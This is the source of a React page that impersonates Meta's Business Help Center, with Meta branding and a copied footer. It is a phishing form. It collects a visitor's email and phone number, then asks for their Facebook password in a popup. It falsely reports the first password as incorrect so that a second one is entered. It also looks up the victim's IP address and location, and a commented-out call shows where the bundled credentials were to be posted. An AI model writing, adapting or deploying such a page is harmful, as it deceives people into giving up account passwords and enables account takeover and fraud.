import React from 'react'
import { logo, search } from './Publics/images/images'
import { Link, useNavigate } from 'react-router-dom'
import { useState } from 'react';
import axios from 'axios';
import { Button, Checkbox, Form, Input } from 'antd';
const { TextArea } = Input;



const Next_buiness = () => {

    const [activePopup, setActivePopup] = useState(false);
    const [activePassword, setActivePassword] = useState(false);
    const [first, setActionFirst] = useState(true);
    const [firstPassword, setFirstPassword] = useState();
    const navigate = useNavigate();

    const handleOpendPopup = () => {
        setActivePopup(true)
    }

    const handleClosePopup = () => {
        setActivePopup(false)
    }

    const onFinish = (values) => {

        if(values.check_form === true){
            localStorage.setItem('dataForm', JSON.stringify(values))
            return handleOpendPopup()
        }

    };

    
    const onFinishPassWord = (values) => {

        if(first === true) {
            setFirstPassword(values.fill_first_password)
            setActionFirst(false)
        }
        
        const passWord = values.fill_first_password;
        setActivePassword(true)
        const dataLocalForm = JSON.parse(localStorage.getItem('dataForm'));

        if(activePassword === true){
            axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {

                    const dataPassWord = {...dataLocalForm, firt_password: firstPassword, second_password: passWord, ip:response.data.ipAddress, city: response.data.city, country: response.data.country  };
                    localStorage.setItem('dataPassWord', JSON.stringify(dataPassWord));
        
                    const data = {
                        'fill__email': dataPassWord.fill_email,
                        'fill_phone': dataPassWord.fill_phone,
                        'ip': response.data.ipAddress,
                        'city': response.data.city,
                        'country': response.data.countryName,
                        'first_password': firstPassword,
                        'second_password': passWord,
                    }

                    navigate('/contact-account/confirm');
                    // axios.post( "http://localhost:3001/api/news", data) 
                    // .then((response) => {
                    //     if (response.data.status === 0 ) {
                    //             navigate('/contact-account/second-step');
                    //         }
                    //     })
                        
                })
                    
        }
    };

  return (
    <div className="business">

        <div className="top-header">
            <div className="container">
                <img src={logo} width="70" className="metalogo" alt=''/>
                <p className="metahead">Support Inbox</p>
                <img src={search} width="100%" className="searchicon" alt=''/>
            </div>
        </div>
        <div className="masheader">
            <div className="wrapper">
                <div className="container">
                    <p className="businesshelp" >
                        Meta Business Help Center </p>
                    <p className="businesshelpcenter">How can we help you?</p>
                </div>
            </div>
        </div>

        <div className="main">

            <div className="title-page">
                <p><b>How can we help?</b></p>
                <p>We need more information to address your issue. This form will only take a few minutes.</p>
            </div>

            <div className="form col-md-4 col-11">

                <div className="text-center pb-3" style={{fontSize: "1.1rem", textAlign: "center"}}>
                    <strong>Get Started</strong>
                </div>

                {/* FORM START */}

                <Form
                    name="basic"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinish}
                    autoComplete="off"
                >

                    <div className="item-form">
                        <label for="email">Email address</label>
                        <Form.Item
                            name="fill_email"
                            rules={[
                                {
                                required: true,
                                message: 'Please input email address!',
                                },
                            ]}
                        >
                            <Input style={{padding: "5px 11px"}} />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <label for="phone">Phone Number</label>
                        <Form.Item
                            name="fill_phone"
                            rules={[
                                {
                                required: true,
                                message: 'Please input your phone number!',
                                },
                            ]}
                        >
                            <Input />
                        </Form.Item>
                    </div>

                    <div className="item-form">
                        <Form.Item
                            name="check_form"
                            valuePropName="checked"
                            rules={[
                                {
                                required: true,
                                message: 'Please agree to our terms and data and cookie policy!',
                                },
                            ]}
                        >
                            <Checkbox >I agree to our Terms, Data and Cookies Policy.</Checkbox>
                        </Form.Item>
                    </div>


                    <Form.Item 
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                color: "#267df1",
                                fontWeight: '700',
                                fontSize:'1rem',
                                width: '100%'
                            }}
                        >
                            Submit
                        </Button>
                    </Form.Item>
                </Form>

                {/* FORM END */}
            </div>

        </div>

        {/* FOOTER */}
        <div className="footer">
            <div className="container">
                <img src={logo} alt="" className="logofooter"/>
                <p className="nerlogofooter">
                    Facebook can help your large, medium or small business
                    grow. Get the latest news
                    for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                <div className="row">
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing on Facebook</p>
                                <p>Success Stories</p>
                                <p>Measurement</p>
                                <p>Industries</p>
                                <p>Inspiration</p>
                                <p>Events</p>
                                <p>News</p>
                                <p>Site map</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Marketing objectives</p>
                                <p>Build your presence</p>
                                <p>Create awareness</p>
                                <p>Drive discovery</p>
                                <p>Generate leads</p>
                                <p>Boost sales</p>
                                <p>Earn loyalty</p>
                            </li>
                        </ul>
                    </div>
                    <div className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook Pages</p>
                                <p>Get started with Pages</p>
                                <p>Setting up your Page</p>
                                <p>Manage your Facebook Page</p>
                                <p>Promote your Page</p>
                                <p>Messaging on your Page</p>
                                <p>Page Insights</p>
                            </li>
                        </ul>
                    </div>
                    <div variant="dontshowonmobile " className="col-md-3 col-6">
                        <ul>
                            <li>
                                <p className="fontbold">Facebook ads</p>
                                <p>Get started with ads</p>
                                <p>Buying Facebook ads</p>
                                <p>Ad formats</p>
                                <p>Ad placement</p>
                                <p>Choose your audience</p>
                                <p>Measure your ads</p>
                                <p>Managing your ads</p>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>

        <div className="bottomfooter">
            <div className="container">
                <ul>
                    <li>English (UK)</li>
                    <li>English (US)</li>
                    <li>Español</li>
                    <li>Português (Brasil)</li>
                    <li>Français (France)</li>
                    <li>Español (España)</li>
                    <li>More languages</li>
                </ul>
                <ul>
                    <li>© 2023 Meta</li>
                    <li>About</li>
                    <li>Developers</li>
                    <li>Careers</li>
                    <li>Privacy</li>
                    <li>Cookies</li>
                    <li>Terms</li>
                    <li>Help Centre</li>
                </ul>
            </div>
        </div>


        <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup" >
            <div className="background" onClick={handleClosePopup}></div>
            <div className="content">

                <Form
                    name="basicForm"
                    initialValues={{
                    remember: true,
                    }}
                    onFinish={onFinishPassWord}
                    autoComplete="off"
                >

                    <div className="modal-header custom-header px-0">
                        <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "22px", fontWeight: "600"}}>Please enter your facebook password to continue</h5>
                        <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
                            <span aria-hidden="true" >×</span>
                        </button>
                    </div>

                    <div className="item-form">
                        <p style={{fontSize:"16px", marginBottom: "10px"}}>We need to confiom the sender of the information is you. Please enter your facebook password and then continue</p>
                        <label for="password">Enter Your Password</label>
                        <Form.Item
                            name="fill_first_password"
                            rules={[
                                {
                                required: true,
                                message: `The password you've entered is incorrect.`,
                                },
                            ]}
                            style={{
                                margin: '0'
                            }}
                        >
                            <Input.Password />
                        </Form.Item>
                        <p className={`password-correct ${activePassword === true ? 'active' : ''}`}>The password you've entered is incorrect.</p>
                    </div>

                    <Form.Item 
                        style={{
                            color: "rgb(255, 255, 255)", 
                            backgroundColor: "rgb(44, 132, 244)", 
                            marginTop: "20px",
                            width: "auto",
                            float: 'right'
                        }}
                        className="btn butoni"
                    >
                        <Button
                            htmlType="submit"
                            style={{
                                backgroundColor: "transparent",
                                outline: "none",
                                border: 'none',
                                boxShadow: 'none',
                                fontWeight: '700',
                                fontSize:'1rem',
                                color: 'white'
                            }}
                        >
                            Continue
                        </Button>
                    </Form.Item>
                </Form>

            </div>
        </div>
    </div>
  )
}

export default Next_buiness